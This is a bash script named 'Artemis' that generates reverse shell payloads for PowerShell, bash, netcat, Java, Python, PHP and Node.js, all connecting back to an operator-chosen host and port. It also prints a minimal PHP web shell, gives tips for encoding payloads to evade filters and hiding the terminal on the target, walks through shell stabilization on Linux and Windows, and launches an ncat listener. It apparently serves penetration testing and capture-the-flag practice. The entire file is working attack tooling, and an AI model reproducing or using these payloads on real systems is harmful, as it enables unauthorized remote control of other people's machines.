#!/bin/bash

#To-DO: Add Ruby & Perl payloads
line="\n============================================================\n"
listen=""
ad=""
opt=""

Help()
{
  cat <<EOF
Artemis will run in interactive mode unless required arguments are supplied.

[Options]
	-h: Display this help menu
	-a: Generate commands for pivoting in Active Directory, instead of reverse shell payloads. If used, all other arguments will be ignored
	-i <IP_ADDRESS>: Your listener's IP Address
	-p <PORT>: Your listener's port
	-l: Start a listener using specified interface and port
	-t <TARGET_OS>: Specify the target OS for Web shell payloads & for stabilization tips [win/nix]
	-s <PAYLOAD>: Specify the type of Reverse shell to generate

[Payloads]
	ps: PowerShell
	bash
	nc: Netcat (*nix targets)
	java
	py: Python (*nix targets)
	php: (*nix targets)
	node: Node.js (*nix targets)

[Usage]
	artemis -i 10.10.144.68 -p 443 -s php -t nix -l
	artemis -a

[Troubleshooting]
	If you're having trouble catching a shell, try the following steps-

	1) Double check your firewall settings & verify target's IP Address
	2) Instead of using a Reverse shell payload, start capturing ICMP packets and use a payload to make the target ping you a few times
	3) Use common ports for your Reverse shell (e.g. 80 or 443) or try ports that hosts in your target's LAN are using

EOF
exit 0
}

PowerSHELL()
{
  text="\$Text = '\$client = New-Object System.Net.Sockets.TCPClient(\"$host\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()'"

  ops='$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text); $EncodedText =[Convert]::ToBase64String($Bytes); $EncodedText'

  payload=$(echo -n "$text; $ops" | pwsh -Command -)
}

if [ $# -eq 0 ]; then
  echo -e "\nNo arguments provided. Defaulting to interactive mode.\n\n[!] Tip: Use the -h argument to view the help menu\n"
else
  while getopts ":hi:p:ls:t:a" option; do
    case $option in
      h)
        Help
        ;;
      i)
        host="$OPTARG"
        ;;
      p)
        port="$OPTARG"
        ;;
      l)
        listen=1
        ;;

      s)
        shell="$OPTARG"
        ;;
      t)
        target="$OPTARG"
        ;;
      a)
        ad=0
        ;;
      \?)
        echo -e "\nError: Invalid argument"
        Help
        ;;
    esac
  done
fi

if [[ -z "$ad" && $# -eq 0 ]]; then
  echo -e "\nSelect an operation:\n[1] Generate Reverse shell payload\n[2] Perform Active Directory pivoting\n"
  read pivot

  if [[ "$pivot" == "2" ]]; then
    ad=0
  else
    ad=1
  fi
fi

if [[ "$ad" == "0" ]]; then
  source $(readlink $(which artemis) | awk -F 'artemis.sh' '{print $1}')ad_LateralMove.sh
  exit
fi

if [[ -z "$host" ]]; then
  echo -e "\nThe following interfaces have been detected:\n"
  ip -c a
  echo -e "\nEnter your IP Address: "
  read host
  echo -e "$line"
fi

if [[ -z "$port" ]]; then
  echo "Enter the Listener's port number"
  read port
  echo -e "$line"
fi

if [[ -z "$shell" ]]; then
  cat <<EOF
Select an operation:

[1] PowerShell
[2] Bash
[3] Netcat
[4] Java
[5] Python
[6] PHP
[7] Node.js
EOF
  read shell
fi

case $shell in
  ps|1)
    echo -e "\nOutputting an Encoded Powershell payload for $host:$port\n"
    PowerSHELL

    echo -e "\n[!] Tip: The Basic Syntax is more reliable, but it may not run as a 64-bit process depending on the context that the payload is executed in. You can try to force the target to run Powershell (x64) using the x64 Syntax\n\n$line"

    echo -e "\nBasic Syntax:\n\npowershell -enc $payload"

    echo -e "\n\nx64 Syntax:\n\n"
    echo "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -enc $payload"

    echo -e "\n\n[+] Additional Arguments: Optionally add other parameters like '-NoP' (NoProfile) & '-W Hidden' (Hide terminal on the target machine)\n$line" 
    ;;
  bash|2)
    echo -e "\nOutputting Bash payloads for $host:$port\n\n" 
    echo -e "[!] Tip: URL-Encoding the Basic Payload can break it. Try the B64 Payload if you need to URL-Encode it, or bypass basic filters\n\n"

    basic="bash -i >& /dev/tcp/$host/$port 0>&1"
    b64=$(echo -n "$basic" | base64)

    echo -e "Basic Payload:\n$basic"
    echo -e "\n\nB64 Payload:\necho $b64|base64 -d|bash"
    ;;
  nc|3)
    echo -e "\nOutputting Netcat payloads for a Linux target using $host:$port\n\n[!] Tip: Named Pipe Payload is preferred and Alternate Payload only works for certain versions of Netcat\n\n"

    echo -e "Named Pipe Payload:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $host $port >/tmp/f\n\n"

    echo -e "Alternate Payload:\nnc -e /bin/sh $host $port"
    ;;
  java|4)
    if [[ -z "$target" ]]; then
      echo -e "Specify the target's OS:\n[1] Linux\n[2]Windows\n"
      read opt

      if [[ "$opt" == "1" ]]; then
        target="nix"
      elif [[ "$opt" == 2 ]]; then
        target="win"
      else
        echo -e "\nYou did not select a valid option\nExitting\n"
        exit
      fi
    fi

    if [[ "$target" == "nix" ]]; then
      echo -e "\nOutputting a Java payload for Linux target using $host:$port\n\n"

      echo "r = Runtime.getRuntime()"
      echo "p = r.exec([\"/bin/bash\", \"-c\", \"exec 5<>/dev/tcp/$host/$port; cat <&5 | while read value; do \\\$value 2>&5 >&5; done\"] as String[])"
      echo "p.waitFor()"

    elif [[ "$target" == "win" ]]; then
      PowerSHELL
      echo -e "\nOutputting a Java payload for Windows target using $host:$port\n\n"
      echo -e "$line\nWARNING: Verify this works with the space after payload / before the quotes in line 2. The PowerSHELL function adds the space\n$line"
      echo "r = Runtime.getRuntime()"
      echo -n "p = r.exec([\"powershell.exe\", \"-enc\","; echo -n \"$payload\"; echo "] as String[])"
#     echo "p = r.exec([\"powershell.exe\", \"-enc\", \"$payload\"] as String[])"
      echo "p.waitFor()"
    fi
    ;;
  py|5)
    echo -e "\n[!] Tip: Depending on the target, you may need to substitute 'python3' for 'python' or 'python2'. This payload is for a Linux target.\n\n"
    echo -e "Outputting a Python payload for $host:$port\n"

    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    ;;
  php|6)
    #Quotes around EOF means nothing will be evaluated (i.e., backticks)
    cat <<'EOF'
[Generic Web shell]

[!] Tip: This is the smallest possible payload, & it should work on any PHP server.

If you're adding the payload to an existing file, append the PHP closing tags ?>

Navigate to the file's URL to execute commands (e.g. https://example.com/shell.php?0=whoami)

{Tiny Payload}

<?=`$_GET[0]`
EOF
    echo -e "$line\n[Linux Payloads]\n\n"
    echo -e "[!] Tip: You can use PHP to execute other payloads by placing them inside the exec() or system() functions (e.g. for a Windows Target).\n"
    echo -e "Outputting PHP payloads for $host:$port\n\n\n{Basic Payload: String}\n"

    echo "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    echo -e "\n\n{Alternate Payload: PHP tags}\n"
    echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'\");?>"
    ;;

  node|7)
    echo -e "\nOutputting Node.js Payload for $host:$port\n\n"
    echo "require('child_process').exec('bash -i >& /dev/tcp/$host/$port 0>&1');"
    ;;

  *)
    echo -e "\nYou did not select a valid option\n"
    Help
    ;;
esac
echo -e "$line"

if [[ -z "$target" ]]; then
  cat <<EOF
[Stabilization]

Select your target's OS:

	[0] Skip Stabilization
	[1] Linux Target
	[2] Windows Target
EOF
  read opt
  if [[ "$opt" == "0" ]]; then
    target="skip"
  elif [[ "$opt" == "1" ]]; then
    target="nix"
  elif [[ "$opt" == "2" ]]; then
    target="win"
  else
    echo -e "\nYou did not select a valid option\n"
  fi
fi

if [[ "$target" == "skip" ]]; then
  echo -e "\nSkipping...\n$line"

elif [[ "$target" == "nix" ]]; then
  cat <<EOF
[Stabilize Linux shell]

[!] Tip: You may be able to create SSH Keys on the target machine and use them for an upgraded shell

	1) Identify SW on target:
	  which python python2 python3 ruby perl lua

	2) Example Commands:
	  python3 -c 'import pty;pty.spawn("/bin/bash")'
	  perl -e 'exec "/bin/sh";'
	  ruby -e 'exec "/bin/sh"'
	  lua -e "os.execute('/bin/sh')"

	3) Set Shell Type:
	  export SHELL=bash

	4) Set Terminal Type:
	  export TERM=xterm-256color
EOF
#	5) {Optional} Configure Attacker's Terminal:
#	  A) Background Reverse Shell:
#	    Press CTRL+Z
#	  B) Disable Attacker's Echo:
#	    stty raw -echo
#	  C) Get Size of Terminal Window: This changes if you resize the terminal!
#	    stty size
#	  D) Foreground Reverse Shell: Press "Enter" a couple times afterwards
#	    fg
#	  E) Set Reverse Shell Terminal Size: Replace X & Y with the numbers from Step C
#	    stty rows X columns Y

elif [[ "$target" == "win" ]]; then
  cat <<'EOF'
[Stabilize Windows shell]

Use this shell to create a "Backup Shell" that you'll use. It may be more stable, but it's mainly in case you cause the shell to freeze while using it.

{Setup}
	1) Navigate to a Writable Directory:
	  cd \users\public

	2) Create a file with your payload [May be bad advice. These may want an EXE, like the Process command]:
	  Write-Output "PAYLOAD" > shell.ps1

{Methods}
	1) Process: (Try with and without "-NoNewWindow")
	  Start-Process -FilePath "powershell" -ArgumentList "-enc ENCODED"

	2) Job:
	  Start-Job .\shell.ps1

	3) Run in foreground:
	  C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe \Users\Public\shell.ps1

EOF
else
  echo -e "\nYou did not select a valid option\n"
fi

echo -e "$line"

if [[ -z "$listen" ]]; then
  echo -e "\nDo you want to automatically start a listener? [y/N]\n\n"
  read opt
  echo -e $line
  if [[ "$opt" == "y" ]]; then
    listen=1
  else
    exit
  fi
fi

if [[ "$listen" == "1" ]]; then
  rlwrap ncat -lvnp "$port"
fi
